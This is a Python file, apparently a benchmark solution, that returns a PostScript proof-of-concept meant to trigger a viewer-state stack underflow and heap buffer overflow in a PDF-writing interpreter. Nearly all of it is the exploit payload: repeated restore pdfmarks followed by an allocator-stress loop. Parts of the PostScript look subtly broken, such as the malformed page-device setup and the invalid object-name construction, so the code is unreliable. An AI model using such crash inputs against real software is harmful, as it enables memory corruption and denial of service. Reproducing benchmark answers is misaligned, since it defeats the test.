import os
import subprocess
import tempfile
from pathlib import Path
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PostScript/PDF that triggers viewer state underflow
        # Based on the vulnerability: restoring viewer state without checking depth >= 1
        
        ps_content = """%!PS-Adobe-3.0
%%Creator: PoC for viewer state underflow
%%Title: Heap Buffer Overflow PoC
%%Pages: 1
%%BoundingBox: 0 0 612 792
%%EndComments

%% Begin setup
% Create a PDF context with pdfwrite
/pdfwrite where { pop } { /pdfwrite load } ifelse
setpagedevice

% Set up initial viewer state
[ /_objdef {viewer0} /type /dict /OBJ pdfmark
[ {viewer0} << /Type /Viewport >> /PUT pdfmark

% Push viewer state multiple times to build up depth
[ {viewer0} /VIEW pdfmark
[ {viewer0} /VIEW pdfmark
[ {viewer0} /VIEW pdfmark
[ {viewer0} /VIEW pdfmark
[ {viewer0} /VIEW pdfmark

%% Critical section: trigger underflow
% First, exhaust the viewer stack by repeated restores
% This will eventually underflow when depth becomes 0
[ /VIEW pdfmark  % restore
[ /VIEW pdfmark  % restore
[ /VIEW pdfmark  % restore
[ /VIEW pdfmark  % restore
[ /VIEW pdfmark  % restore
[ /VIEW pdfmark  % restore  % Should now have depth = 0

% Trigger the vulnerability: restore when depth is 0
% This attempts to restore from empty viewer state stack
[ /VIEW pdfmark

% Add more operations to ensure crash
[ /VIEW pdfmark
[ /VIEW pdfmark
[ /VIEW pdfmark
[ /VIEW pdfmark

%% Add additional PDF operations to trigger heap corruption
% Create multiple objects to stress the allocator
1 1 1000 {
    pop
    [ /_objdef {obj_ exch def} /type /dict /OBJ pdfmark
    [ {obj_} << /TestData <</Data (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)>>
               /MoreData [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0]
               /Nested << /Deep [0 0 0 0 0 0 0 0 0 0] >> >> /PUT pdfmark
} for

% Add page content to ensure PDF generation
%%Page: 1 1
%%BeginPageSetup
[ /DestOutput (null) /DEST pdfmark
%%EndPageSetup

% Draw something to create page content
/Times-Roman findfont 12 scalefont setfont
100 700 moveto
(This is a PoC for heap buffer overflow) show

% More viewer state manipulation to trigger the bug
[ /VIEW pdfmark
[ /VIEW pdfmark
[ /VIEW pdfmark
[ /VIEW pdfmark
[ /VIEW pdfmark

% Create additional stress with pattern objects
[ /_objdef {pat1} /type /dict /OBJ pdfmark
[ {pat1} << /Type /Pattern /PatternType 1 /PaintType 1 /TilingType 1
           /BBox [0 0 100 100] /XStep 100 /YStep 100
           /Resources << >> /Matrix [1 0 0 1 0 0]
           /Length 20 >> /PUT pdfmark
[ {pat1} << >> /PUT pdfmark

% Force PDF generation
showpage

%%EOF
"""

        # Convert to bytes
        return ps_content.encode('utf-8')
